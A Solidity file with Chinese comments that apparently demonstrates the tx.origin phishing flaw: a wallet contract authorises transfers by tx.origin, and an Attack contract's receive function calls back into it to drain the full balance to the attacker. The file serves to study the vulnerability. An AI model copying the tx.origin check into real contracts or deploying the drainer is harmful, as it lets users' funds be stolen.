pragma solidity 0.8.11;

import "hardhat/console.sol";

contract MyWallet {
    address owner1;
    constructor() payable {
        // owner1 = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
        owner1 = msg.sender;
        console.log("owner1: ", owner1);
    }

    receive() external payable {}

    // tx.origin的值仍然是那个外部账户（即攻击者的账户），而不是Attack合约。
    // 这是因为tx.origin表示的是交易的原始发起者，即第一个（也是最终的）交易发起者
    function transferTo(address payable dest, uint _mount) public {
        // tx.origin: 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2
        // owner1: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
        // msg.sender: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 
        console.log("msg.sender: ", msg.sender, " owner1: ",owner1);
        require(tx.origin == owner1);
        (bool success, ) = dest.call{value: _mount}("");
        require(success);
    }
}

interface UserWallet {
    function transferTo(address payable dest, uint _amount) external ;
}

contract Attack {
    address payable owner2;
    constructor() payable {
        // owner2 = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2
        owner2 = payable(msg.sender);
        console.log("owner2: ", owner2);
    }

    // 部署MyWallet合约的外部账户调用TransferTo方法时，不是把以太币转给Attack合约，
    // 而是转给部署Attack合约的外部账户,也就是下面这个receive()函数没有调用
    receive() payable external{
        // 这里的msg.sender指向MyWallet合约的地址 msg.sender = 
        console.log("msg.sender: ", msg.sender, " msg.value: ", msg.value);
        UserWallet(msg.sender).transferTo(owner2, msg.sender.balance - msg.value);
    }
}